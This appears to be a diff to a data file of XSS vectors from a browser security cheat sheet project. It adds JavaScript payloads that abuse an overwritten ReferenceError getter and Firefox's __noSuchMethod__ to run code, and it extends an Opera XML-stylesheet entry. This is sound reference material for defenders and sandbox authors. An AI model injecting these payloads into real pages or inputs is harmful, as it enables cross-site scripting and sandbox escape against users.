@@ -112,7 +112,7 @@ var items =
             ]
         },
         'tags'       : ['xss', 'autofocus', 'chrome', 'opera'],
-        'reporter'   : 'gaz'
+        'reporter'   : 'gareth'
     },
     { /* ID 8 - Self-executing blur event via autofocus competition */
         'id'         : 8, 
@@ -275,7 +275,7 @@ var items =
         'category'   : 'xml', 
         'name'       : 'Opera XML-stylesheets executing JavaScript',
         'data'       : '<?xml-stylesheet href="%js_uri_alert%"?>',
-        'description': 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and executes the JavaScript afterwards without user interaction.',
+        'description': 'Opera 9.x and 10.0 allow to apply XML-stylesheets with JavaScript URIs and executes the JavaScript afterwards without user interaction. The vectors even works if the page is delivered as text/html.',
         'tickets'    : [],
         'howtofix'   : 'Make sure that user input cannot contain XML stylesheets or tags not consisting of <\\w+ - because this vector would only be matched via <\\?\\w+ but still executes JavaScript without user interaction. Avoid blacklists is possible.',            
         'browsers'   : {
@@ -317,5 +317,35 @@ var items =
         },
         'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
         'reporter'   : 'yosuke.hasegawa'
-    },  
+    },
+    { /* ID 20 - JavaScript execution via overwritten ReferenceError object */
+        'id'         : 20,
+        'category'   : 'javascript', 
+        'name'       : 'JavaScript execution via overwritten ReferenceError object',
+        'data'       : 'ReferenceError.prototype.__defineGetter__(\'name\', function(){alert(1)}),x',
+        'description': 'This JavaScript vector shows how overwriting the ReferenceError object and causing the exact same kind of error afterwards can lead to JavaScript execution. This is of course the same for most oher error objects and should ba taken into consideration when implementing JavaScript sandboxes or comparable.',
+        'tickets'    : [],
+        'howtofix'   : 'Do not trust the DOM in case the user can influence it via script injections, includes or other DOM based property access.',            
+        'browsers'   : {
+            'opera': ['8.x', '9.x', '10.x'], 
+            'firefox' : ['1.x', '2.x', '3.x'], 
+            'chrome': ['3.x', '4.x', '5.x']
+        },
+        'tags'       : ['xss', 'javascript', 'opera', 'xml', 'css'],
+        'reporter'   : '.mario'
+    },
+    { /* ID 21 - JavaScript execution via proprietary __noSuchMethod__  */
+        'id'         : 21,
+        'category'   : 'javascript', 
+        'name'       : 'JavaScript execution via proprietary __noSuchMethod__',
+        'data'       : 'Object.__noSuchMethod__ = Function,[{}][0].constructor._(\'alert(1)\')()',
+        'description': 'Firefox supports the non-standard __noSuchMethod__ property which will be used as an interceptor as soon as a non existing object method is being called. It can be assigned with the Function object to force JavaScript execution without using function(){...}.',
+        'tickets'    : [],
+        'howtofix'   : '',            
+        'browsers'   : {
+            'firefox' : ['3.5', '3.6', '3.7'] 
+        },
+        'tags'       : ['xss', 'javascript', 'firefox', '__noSuchMethod__'],
+        'reporter'   : 'gareth, .mario'
+    }
 ]
